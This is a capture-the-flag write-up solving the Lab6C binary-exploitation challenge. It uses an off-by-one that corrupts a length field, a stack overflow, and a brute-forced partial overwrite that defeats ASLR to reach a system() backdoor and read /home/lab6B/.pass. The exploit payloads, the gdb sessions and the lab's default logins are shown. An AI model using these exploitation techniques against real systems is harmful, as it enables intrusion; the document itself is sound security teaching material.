---
title: "Разбор Lab6C (легко)"
permalink: /writeups/mbe/lab6c/
excerpt: "Разбор Lab6C."
---

---
First, log into the Lab06 as **Lab6C** (`lab6C:lab06start`) and go to the challenges folder:

```shell
$ ssh lab6C@<VM_IP>
$ cd /levels/lab06/
```

In the last lab, **DEP** has been enabled in order to disable executable stack. Now, we need to add a new exploit mitigation feature, **ASLR** (or Address Space Layout Randomization). 

This exploit mitigation technology is used to ensure that address ranges for important memory segments (heap, stack, libraries) are random for every execution. While we still can get control of EIP, we don't know where we can go from there as we won't be able to hardcode memory addresses.

First, let's check if ASLR is enabled:

```bash
lab6C@warzone:/levels/lab06$ cat /proc/sys/kernel/randomize_va_space
0
```

Nope. But we can enable it until the next reboot or permanently: 

- Until reboot: `echo 2 > /proc/sys/kernel/randomize_va_space`
- Persist reboot: `echo 'kernel.randomize_va_space = 2' > /etc/sysctl.d/01-disable-aslr.conf`

**Заметка** You will need privileges to perform the change. It can be done with the **gameadmin** account (`gameadmin:gameadmin`).
{: .notice--info}

Let's recheck if ASLR is now enabled:

```bash
lab6C@warzone:/levels/lab06$ cat /proc/sys/kernel/randomize_va_space
2
```

Perfect! Let's execute the program to see what is does.

```bash
$ ./lab6C
--------------------------------------------
|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |
--------------------------------------------
>: Enter your username
>>: Test
>: Welcome, Test
>: Tweet @Unix-Dude
>>: PLOP !
>: Tweet sent!
```

Here, we can specify a username and send a message. One of these fields is probably vulnerable...

## Анализ исходного кода

Let's check the source code.

```c
/*
Exploitation with ASLR
Lab C

 gcc -pie -fPIE -fno-stack-protector -o lab6C lab6C.c
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct savestate {
    char tweet[140];
    char username[40];
    int msglen;
} save;

void set_tweet(struct savestate *save );
void set_username(struct savestate * save);

/* debug functionality, not used in production */
void secret_backdoor()
{
    char cmd[128];

    /* reads a command and executes it */
    fgets(cmd, 128, stdin);
    system(cmd);

    return;
}

void handle_tweet()
{
    struct savestate save;

    /* Initialize our save state to sane values. */
    memset(save.username, 0, 40);
    save.msglen = 140;

    /* read a username and tweet from the user */
    set_username(&save);
    set_tweet(&save);

    printf(">: Tweet sent!\n");
    return;
}

void set_tweet(struct savestate *save )
{
    char readbuf[1024];
    memset(readbuf, 0, 1024);

    printf(">: Tweet @Unix-Dude\n");
    printf(">>: ");

    /* read a tweet from the user, safely copy it to struct */
    fgets(readbuf, 1024, stdin);
    strncpy(save->tweet, readbuf, save->msglen);

    return;
}

void set_username(struct savestate * save)
{
    int i;
    char readbuf[128];
    memset(readbuf, 0, 128);

    printf(">: Enter your username\n");
    printf(">>: ");

    /* Read and copy the username to our savestate */
    fgets(readbuf, 128, stdin);
    for(i = 0; i <= 40 && readbuf[i]; i++)
        save->username[i] = readbuf[i];

    printf(">: Welcome, %s", save->username);
    return;
}

int main(int argc, char * argv[])
{

    printf(
    "--------------------------------------------\n" \
    "|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |\n" \
    "--------------------------------------------\n");

    /* make some tweets */
    handle_tweet();

    return EXIT_SUCCESS;
}
```

That's a big piece of code, we have the *secret_backdoor()* function which is probably the target function we need to reach, but can you see the issues which could help us to reach it? Let me help you. First, look at the *savestate* structure.

```c
struct savestate {
    char tweet[140];
    char username[40];
    int msglen;
} save;
```

This structure is declared as **save** in the *handle_tweet()* function and the *msglen* is set at **140**. Nothing suspicious, yet.

```c
void handle_tweet()
{
    struct savestate save;

    memset(save.username, 0, 40);
    save.msglen = 140;

...[snip]...

}
```

However, if you check the **set_username()** function, we have an off-by-one error in the *for* loop. 

```c
void set_username(struct savestate * save)
{

...[snip]...
    fgets(readbuf, 128, stdin);
    for(i = 0; i <= 40 && readbuf[i]; i++)
        save->username[i] = readbuf[i];

...[snip]...

}
```

This is due to the `i <= 40` comparison, it should be `i < 40`. Here, the comparison used is **<=** (less than or equal to), the loop will be carried out 41 times. We have our first issue, we can overwrite the **msglen** in our structure by using a 41-char long **username**.

This gives us an edge to exploit the second issue. As per the structure declaration, the *char* array that handle the tweet (or message) can handle **140** characters. However, if we check the *set_tweet* function, the *strncpy()* call is based on **msglen**. 

```c
void set_tweet(struct savestate *save )
{
    char readbuf[1024];
    memset(readbuf, 0, 1024);

    printf(">: Tweet @Unix-Dude\n");
    printf(">>: ");

    fgets(readbuf, 1024, stdin);
    strncpy(save->tweet, readbuf, save->msglen);

    return;
}
```

If we can tamper the **msglen** variable with another value by specifying a 41-char long username, we can overwrite the EIP by *asking* the *strncpy()* function to overflow `char tweet[140];`. Enough for the theory, let's get practical.

## Динамический анализ

First, let's see where is our structure and how it looks like in memory. As the structure is declared in *handle_tweet()*, we can start here.

```nasm
$ gdb -q ./lab6C
Reading symbols from ./lab6C...(no debugging symbols found)...done.
gdb-peda$ disas handle_tweet
Dump of assembler code for function handle_tweet:
   0x0000077a <+0>: push   ebp
   0x0000077b <+1>: mov    ebp,esp
   0x0000077d <+3>: push   ebx
   0x0000077e <+4>: sub    esp,0xd4
   0x00000784 <+10>:    call   0x600 <__x86.get_pc_thunk.bx>
   0x00000789 <+15>:    add    ebx,0x1877
   0x0000078f <+21>:    mov    DWORD PTR [esp+0x8],0x28
   0x00000797 <+29>:    mov    DWORD PTR [esp+0x4],0x0
   0x0000079f <+37>:    lea    eax,[ebp-0xc0]
   0x000007a5 <+43>:    add    eax,0x8c
   0x000007aa <+48>:    mov    DWORD PTR [esp],eax
   0x000007ad <+51>:    call   0x5a0 <memset@plt>
   0x000007b2 <+56>:    mov    DWORD PTR [ebp-0xc],0x8c
   0x000007b9 <+63>:    lea    eax,[ebp-0xc0]
   0x000007bf <+69>:    mov    DWORD PTR [esp],eax
   0x000007c2 <+72>:    call   0x88c <set_username>
   0x000007c7 <+77>:    lea    eax,[ebp-0xc0]
   0x000007cd <+83>:    mov    DWORD PTR [esp],eax
   0x000007d0 <+86>:    call   0x7ed <set_tweet>
   0x000007d5 <+91>:    lea    eax,[ebx-0x15d0]
   0x000007db <+97>:    mov    DWORD PTR [esp],eax
   0x000007de <+100>:   call   0x560 <puts@plt>
   0x000007e3 <+105>:   nop
   0x000007e4 <+106>:   add    esp,0xd4
   0x000007ea <+112>:   pop    ebx
   0x000007eb <+113>:   pop    ebp
   0x000007ec <+114>:   ret
End of assembler dump.
```

The structure address is placed in **EAX** at `handle_tweet+37`. Let's set a breakpoint here and another one on the `ret` instruction at the end of the function.

```nasm
gdb-peda$ break *handle_tweet+43
Breakpoint 1 at 0x7a5
gdb-peda$ break *handle_tweet+114
Breakpoint 2 at 0x7ec
gdb-peda$ run
Starting program: /levels/lab06/lab6C
Error in re-setting breakpoint 1: Warning:
Cannot insert breakpoint 2.
Cannot access memory at address 0x7ec

--------------------------------------------
|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |
--------------------------------------------
[----------------------------------registers-----------------------------------]
EAX: 0xbfd53f38 --> 0xb76ef000 ('-' <repeats 44 times>, "\n")
EBX: 0xb7719000 --> 0x1efc
ECX: 0xb76ef000 ('-' <repeats 44 times>, "\n")
EDX: 0xb76e5898 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0xbfd53ff8 --> 0xbfd54018 --> 0x0
ESP: 0xbfd53f20 --> 0x1
EIP: 0xb77177a5 (<handle_tweet+43>: add    eax,0x8c)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xb771778f <handle_tweet+21>:    mov    DWORD PTR [esp+0x8],0x28
   0xb7717797 <handle_tweet+29>:    mov    DWORD PTR [esp+0x4],0x0
   0xb771779f <handle_tweet+37>:    lea    eax,[ebp-0xc0]
=> 0xb77177a5 <handle_tweet+43>:    add    eax,0x8c
   0xb77177aa <handle_tweet+48>:    mov    DWORD PTR [esp],eax
   0xb77177ad <handle_tweet+51>:    call   0xb77175a0 <memset@plt>
   0xb77177b2 <handle_tweet+56>:    mov    DWORD PTR [ebp-0xc],0x8c
   0xb77177b9 <handle_tweet+63>:    lea    eax,[ebp-0xc0]
[------------------------------------stack-------------------------------------]
0000| 0xbfd53f20 --> 0x1
0004| 0xbfd53f24 --> 0x0
0008| 0xbfd53f28 --> 0x28 ('(')
0012| 0xbfd53f2c --> 0x0
0016| 0xbfd53f30 --> 0xb76e4ac0 --> 0xfbad2a84
0020| 0xbfd53f34 --> 0xb76e4b54 --> 0xb76e3aa0 --> 0x0
0024| 0xbfd53f38 --> 0xb76ef000 ('-' <repeats 44 times>, "\n")
0028| 0xbfd53f3c --> 0xb75a7ddf (<new_do_write+63>: mov    edi,eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0xb77177a5 in handle_tweet ()
gdb-peda$ x/64x 0xbfd53f38
0xbfd53f38: 0xb76ef000  0xb75a7ddf  0xb76e4ac0  0xb76ef000
0xbfd53f48: 0x0000002d  0xb75aab05  0x0000002d  0x0000000a
0xbfd53f58: 0xb76e5898  0xb75a9b4e  0x0000002d  0xb76e4ac0
0xbfd53f68: 0xb7717b06  0xb75aac0e  0xb76e4ac0  0x0000002d
0xbfd53f78: 0xb76e4ac0  0xb75a9e80  0xb76e4ac0  0xb76ef000
0xbfd53f88: 0x0000002d  0xb76e4000  0x00000086  0xb76e4ac0
0xbfd53f98: 0x00000086  0xb76e4000  0xb76e4ac0  0xb76e4ac0
0xbfd53fa8: 0xb76e5898  0xb75aa795  0xb76e4ac0  0x0000000a
0xbfd53fb8: 0x000000c2  0xb76e4000  0x00000086  0xb76e4000
0xbfd53fc8: 0x00000086  0xb759f794  0xb76e4ac0  0x0000000a
0xbfd53fd8: 0x00000086  0xb7539940  0xbfd54018  0xb7709500
0xbfd53fe8: 0xbfd54044  0xb7719000  0x00000000  0xb7719000
0xbfd53ff8: 0xbfd54018  0xb771798a  0xb7717a80  0xb7716000
0xbfd54008: 0xb77179ab  0xb76e4000  0xb77179a0  0xb76e4000
0xbfd54018: 0x00000000  0xb7553a83  0x00000001  0xbfd540b4
0xbfd54028: 0xbfd540bc  0xb7703cea  0x00000001  0xbfd540b4
gdb-peda$ conti
Continuing.
>: Enter your username
>>: AAAA
>: Welcome, AAAA
>: Tweet @Unix-Dude
>>: BBBB
>: Tweet sent!

...[snip]...

Breakpoint 2, 0xb77177ec in handle_tweet ()
gdb-peda$ x/64x 0xbfd53f38
0xbfd53f38: 0x42424242  0x0000000a  0x00000000  0x00000000 ; Tweet is here
0xbfd53f48: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfd53f58: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfd53f68: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfd53f78: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfd53f88: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfd53f98: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfd53fa8: 0x00000000  0x00000000  0x00000000  0x00000000 
0xbfd53fb8: 0x00000000  0x00000000  0x00000000  0x41414141 ; Name is here
0xbfd53fc8: 0x0000000a  0x00000000  0x00000000  0x00000000
0xbfd53fd8: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfd53fe8: 0x00000000  0x0000008c  0x00000000  0xb7719000 ; Tweet size is here (0x8c = 140)
0xbfd53ff8: 0xbfd54018  0xb771798a  0xb7717a80  0xb7716000
0xbfd54008: 0xb77179ab  0xb76e4000  0xb77179a0  0xb76e4000
0xbfd54018: 0x00000000  0xb7553a83  0x00000001  0xbfd540b4
0xbfd54028: 0xbfd540bc  0xb7703cea  0x00000001  0xbfd540b4
gdb-peda$
```

The address `0xbfd53f38` is our **save** structure. I checked it twice in `gdb`, at the initialization and after inserting data. 
- The message is at `0xbfd53f38`
- The username is at `0xbfd53fc4`
- The size of the message (or **msglen**) is at `0xbfd53fec`

Note that these addresses will change at each execution with ASLR! Let's exploit the first bug and overwrite the **msglen** with **0x7a** (or **z** in ASCII).

```nasm
gdb-peda$ run

...[snip]...

gdb-peda$ conti
Continuing.
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAz
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAz>: Tweet @Unix-Dude
>>: BBBB
>: Tweet sent!
[----------------------------------registers-----------------------------------]
EAX: 0xf
EBX: 0xb779a000 --> 0x1efc
ECX: 0xb7770000 (">: Tweet sent!\n", 'A' <repeats 37 times>, "z>: Tweet @Unix-Dude\n")
EDX: 0xb7766898 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0xbf859f28 --> 0x0
ESP: 0xbf859f0c --> 0xb779898a (<main+40>:  mov    eax,0x0)
EIP: 0xb77987ec (<handle_tweet+114>:    ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xb77987e4 <handle_tweet+106>:   add    esp,0xd4
   0xb77987ea <handle_tweet+112>:   pop    ebx
   0xb77987eb <handle_tweet+113>:   pop    ebp
=> 0xb77987ec <handle_tweet+114>:   ret
   0xb77987ed <set_tweet>:  push   ebp
   0xb77987ee <set_tweet+1>:    mov    ebp,esp
   0xb77987f0 <set_tweet+3>:    push   ebx
   0xb77987f1 <set_tweet+4>:    sub    esp,0x414
[------------------------------------stack-------------------------------------]
0000| 0xbf859f0c --> 0xb779898a (<main+40>: mov    eax,0x0)
0004| 0xbf859f10 --> 0xb7798a80 ('-' <repeats 44 times>, "\n|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |\n", '-' <repeats 44 times>)
0008| 0xbf859f14 --> 0xb7797000 --> 0x20f34
0012| 0xbf859f18 --> 0xb77989ab (<__libc_csu_init+11>:  add    ebx,0x1655)
0016| 0xbf859f1c --> 0xb7765000 --> 0x1a9da8
0020| 0xbf859f20 --> 0xb77989a0 (<__libc_csu_init>: push   ebp)
0024| 0xbf859f24 --> 0xb7765000 --> 0x1a9da8
0028| 0xbf859f28 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0xb77987ec in handle_tweet ()
gdb-peda$ x/64x 0xbf859e48
0xbf859e48: 0x42424242  0x0000000a  0x00000000  0x00000000
0xbf859e58: 0x00000000  0x00000000  0x00000000  0x00000000
0xbf859e68: 0x00000000  0x00000000  0x00000000  0x00000000
0xbf859e78: 0x00000000  0x00000000  0x00000000  0x00000000
0xbf859e88: 0x00000000  0x00000000  0x00000000  0x00000000
0xbf859e98: 0x00000000  0x00000000  0x00000000  0x00000000
0xbf859ea8: 0x00000000  0x00000000  0x00000000  0x00000000
0xbf859eb8: 0x00000000  0x00000000  0xb7760000  0x0000000a
0xbf859ec8: 0x000000c2  0xb7765000  0x00000086  0x41414141
0xbf859ed8: 0x41414141  0x41414141  0x41414141  0x41414141
0xbf859ee8: 0x41414141  0x41414141  0x41414141  0x41414141
0xbf859ef8: 0x41414141  0x0000007a  0x00000000  0xb779a000 ; We overwrote 0x8c with 0x7a!
0xbf859f08: 0xbf859f28  0xb779898a  0xb7798a80  0xb7797000
0xbf859f18: 0xb77989ab  0xb7765000  0xb77989a0  0xb7765000
0xbf859f28: 0x00000000  0xb75d4a83  0x00000001  0xbf859fc4
0xbf859f38: 0xbf859fcc  0xb7784cea  0x00000001  0xbf859fc4
gdb-peda$
```

As we can see, we were able to overwrite **msglen** with **0x7a**. 

```c
void set_tweet(struct savestate *save )
{
    char readbuf[1024];
    memset(readbuf, 0, 1024);

    printf(">: Tweet @Unix-Dude\n");
    printf(">>: ");

    fgets(readbuf, 1024, stdin);
    strncpy(save->tweet, readbuf, save->msglen);

    return;
}
```

Now, we will write a proof of concept to see of we can get the control of **EIP**. Here, we will change the **msglen** with **0xfa** (or 250 in decimal) to overflow the `tweet[140]` member in the **save** structure.

```nasm
gdb-peda$ pattern_create 250
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0'
gdb-peda$ r < <(python -c "print(40 * 'A' + '\xfa\n' + 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0')")
Starting program: /levels/lab06/lab6C < <(python -c "print(40 * 'A' + '\xfa\n' + 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0')")
--------------------------------------------
|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Tweet @Unix-Dude
>>: >: Tweet sent!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xf
EBX: 0x41417741 ('AwAA')
ECX: 0xb7759000 (">>: >: Tweet sent!\n", 'A' <repeats 37 times>, "\372>: Tweet @Unix-Dude\n")
EDX: 0xb774f898 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x79414178 ('xAAy')
ESP: 0xbfd493c0 ("%%A%sA%BA%%nA%CA%-A%(A%DA%;A%)A%EA%aA%0\n")
EIP: 0x417a4141 ('AAzA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x417a4141
[------------------------------------stack-------------------------------------]
0000| 0xbfd493c0 ("%%A%sA%BA%%nA%CA%-A%(A%DA%;A%)A%EA%aA%0\n")
0004| 0xbfd493c4 ("sA%BA%%nA%CA%-A%(A%DA%;A%)A%EA%aA%0\n")
0008| 0xbfd493c8 ("A%%nA%CA%-A%(A%DA%;A%)A%EA%aA%0\n")
0012| 0xbfd493cc ("A%CA%-A%(A%DA%;A%)A%EA%aA%0\n")
0016| 0xbfd493d0 ("%-A%(A%DA%;A%)A%EA%aA%0\n")
0020| 0xbfd493d4 ("(A%DA%;A%)A%EA%aA%0\n")
0024| 0xbfd493d8 ("A%;A%)A%EA%aA%0\n")
0028| 0xbfd493dc ("%)A%EA%aA%0\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x417a4141 in ?? ()
gdb-peda$ pattern_search
Registers contain pattern buffer:
EIP+0 found at offset: 205
EBX+0 found at offset: 197
EBP+0 found at offset: 201
Registers point to pattern buffer:
[ESP] --> offset 209 - size ~41
Pattern buffer found at:
0xb77580fc : offset  221 - size   29 (mapped)
0xbfd48fa2 : offset  221 - size   29 ($sp + -0x41e [-264 dwords])
0xbfd493ca : offset  221 - size   29 ($sp + 0xa [2 dwords])
Reference to pattern buffer not found in memory
```

Now, let's edit our PoC with a proper buffer size and take control of **EIP**.

```nasm
gdb-peda$ r < <(python -c "print(40 * 'A' + '\xfa\n' + 196 * 'B' + 'CCCC\n')")
Starting program: /levels/lab06/lab6C < <(python -c "print(40 * 'A' + '\xfa\n' + 196 * 'B' + 'CCCC\n')")
--------------------------------------------
|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Tweet @Unix-Dude
>>: >: Tweet sent!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xf
EBX: 0x42424242 ('BBBB')
ECX: 0xb7736000 (">>: >: Tweet sent!\n", 'A' <repeats 37 times>, "\372>: Tweet @Unix-Dude\n")
EDX: 0xb772c898 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x42424242 ('BBBB')
ESP: 0xbffc6900 --> 0xa ('\n')
EIP: 0x43434343 ('CCCC')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x43434343
[------------------------------------stack-------------------------------------]
0000| 0xbffc6900 --> 0xa ('\n')
0004| 0xbffc6904 --> 0x0
0008| 0xbffc6908 --> 0x0
0012| 0xbffc690c --> 0x0
0016| 0xbffc6910 --> 0x0
0020| 0xbffc6914 --> 0x0
0024| 0xbffc6918 --> 0x0
0028| 0xbffc691c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x43434343 in ?? ()
```

Okay, now we have control over **EIP**. The next step would be to overwrite the **EIP** with the address of the *secret_backdoor()* function and add the command we want to run to our payload. Here we can do something like this as the command we want to run will be pointed by **ESP**:

```nasm
gdb-peda$ r < <(python -c "print(40 * 'A' + '\xfa\n' + 196 * 'B' + 'CCCC' + 'cat /home/lab6B/.pass\n')")
Starting program: /levels/lab06/lab6C < <(python -c "print(40 * 'A' + '\xfa\n' + 196 * 'B' + 'CCCC' + 'cat /home/lab6B/.pass\n')")
--------------------------------------------
|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Tweet @Unix-Dude
>>: >: Tweet sent!

...[snip]...

Invalid $PC address: 0x43434343
[------------------------------------stack-------------------------------------]
0000| 0xbfb865f0 ("cat /home/lab6B/.pass\n")
0004| 0xbfb865f4 ("/home/lab6B/.pass\n")
0008| 0xbfb865f8 ("e/lab6B/.pass\n")
0012| 0xbfb865fc ("b6B/.pass\n")
0016| 0xbfb86600 (".pass\n")
0020| 0xbfb86604 --> 0xa73 ('s\n')
0024| 0xbfb86608 --> 0x0
0028| 0xbfb8660c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x43434343 in ?? ()
```

Now, we can check the current address of *secret_backdoor()* with `gdb`:

```nasm
gdb-peda$ disas secret_backdoor
Dump of assembler code for function secret_backdoor:
   0xb77c672b <+0>:	push   ebp
   0xb77c672c <+1>:	mov    ebp,esp
   0xb77c672e <+3>:	push   ebx

...[snip]...
```

After a few run, due to ASLR, this address will change:
- `0xb77da72b`
- `0xb778d72b`
- `0xb77ae72b`
- `0xb77d772b`
- `0xb775972b`

However, we can see that the address always ends with **0x72b**. It means that we can try to do a partial overwrite and bruteforce a valid address!

## Решение

r < <(python -c "print(40 * 'A' + '\xfa\n' + 196 * 'B' + '\x90\x90\x90\x90\n' + 'cat /home/lab6B/.pass\n')")

lab6C@warzone:/levels/lab06$ for ((i=0; i < 20; i++))
do
(python -c "print(40 * 'A' + '\xfa\n'  + 196 * 'B' + '\x2b\x07' + '\n' + 'cat /home/lab6B/.pass\n')") | ./lab6C
done

```bash
lab6C@warzone:/levels/lab06$ for ((i=0; i < 20; i++))
> do
> (python -c "print(40 * 'A' + '\xc6\n'  + 196 * 'B' + '\x2b\x07' + '\n' + 'cat /home/lab6B/.pass\n')") | ./lab6C
> done
--------------------------------------------
|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Tweet @Unix-Dude
>>: >: Tweet sent!
Segmentation fault (core dumped)

...[snip]...

--------------------------------------------
|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Tweet @Unix-Dude
>>: >: Tweet sent!
p4rti4l_0verwr1tes_r_3nuff
Segmentation fault (core dumped)
```

Awesome!
